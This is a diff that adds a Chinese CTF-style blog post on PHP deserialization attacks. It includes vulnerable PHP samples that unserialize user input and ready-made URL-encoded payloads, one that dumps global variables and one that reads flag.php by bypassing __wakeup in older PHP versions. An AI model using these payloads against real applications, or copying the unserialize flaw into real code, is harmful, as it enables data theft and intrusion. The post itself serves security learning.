@@ -260,6 +260,97 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-phpUnserialize" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/06/05/phpUnserialize/" class="article-date">
+      <time datetime="2021-06-05T15:04:03.000Z" itemprop="datePublished">2021-06-05</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/06/05/phpUnserialize/">PHP反序列化</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="最简单的反序列化"><a href="#最简单的反序列化" class="headerlink" title="最简单的反序列化"></a>最简单的反序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$user</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user == <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">				var_dump(<span class="variable">$GLOBALS</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">	unserialize(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>
+
+<p>当我们反序列化后<code>user</code>为<code>admin</code>时输出<code>$GLOBALS</code>，输出当前<code>php</code>页面全局变量</p>
+<p>我们构造<code>payload</code>如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$user</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> A()));</span><br></pre></td></tr></table></figure>
+
+<p>运行获得<code>url</code>编码<code>序列化</code>后的值为<code>O%3A1%3A%22A%22%3A1%3A%7Bs%3A7%3A%22%00A%00user%22%3Bs%3A5%3A%22admin%22%3B%7D</code></p>
+<p>将其赋值给<code>data</code>后即可输出<code>全局变量</code></p>
+<p><img src="/2021/06/05/phpUnserialize/image-20210605224100230.png" alt="image-20210605224100230"></p>
+<h2 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="__wakeup绕过"></a>__wakeup绕过</h2><p>在反反序列化时，如果<code>表示对象属性个数的值</code>大于<code>真实的属性个数时</code>就会跳过<code>__wakeup( )</code>的执行。</p>
+<p>影响版本</p>
+<p><code>php5.0.0 ~ php5.6.25</code></p>
+<p><code>php7.0.0 ~ php7.0.10</code></p>
+<p><code>php</code>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$filename</span> = <span class="string">&#x27;test.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;test.txt&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">	unserialize(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>php</code>语言的特性为在反序列化时，先执行<code>__wakeup()</code>魔术方法，才会执行<code>__destruct()</code>魔术方法</p>
+<p>也就是说当我们使用<code>payload</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$filename</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> A()));</span><br></pre></td></tr></table></figure>
+
+<p><code>O%3A1%3A%22A%22%3A1%3A%7Bs%3A11%3A%22%00A%00filename%22%3Bs%3A8%3A%22flag.php%22%3B%7D</code></p>
+<p>去反序列化时</p>
+<p>结果为</p>
+<p><img src="/2021/06/05/phpUnserialize/s1.png" alt="php_unseriablize1"></p>
+<p>可以发现我们在反序列化时修改的<code>$filename</code>的值在<code>__wakeup()</code>函数时由<code>flag.php</code>修改为了<code>test.txt</code></p>
+<p>绕过<code>__wakeup()</code>函数时将<code>对象属性个数的值</code>大于<code>真实的属性个数时</code>即可绕过</p>
+<p>即<code>O%3A1%3A%22A%22%3A1%3A%7Bs%3A11%3A%22%00A%00filename%22%3Bs%3A8%3A%22flag.php%22%3B%7D</code></p>
+<p>改为，只需要将对象个数大于<code>1</code>即可，<code>2</code>，<code>3</code>，<code>4</code>等等都行，这里我使用<code>2</code></p>
+<p><code>O%3A1%3A%22A%22%3A2%3A%7Bs%3A11%3A%22%00A%00filename%22%3Bs%3A8%3A%22flag.php%22%3B%7D</code></p>
+<p>即可获取想要的文件的内容</p>
+<p><img src="/2021/06/05/phpUnserialize/s2.png" alt="php_unseriablize2"></p>
+<h2 id="private-protect变量构造"><a href="#private-protect变量构造" class="headerlink" title="private protect变量构造"></a>private protect变量构造</h2><p>如最开始</p>
+<p>在构造<code>payload</code>时</p>
+<p>将所得的<code>payload</code>进行<code>url编码</code>即可</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/payload/" rel="tag">payload</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-messageSend" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
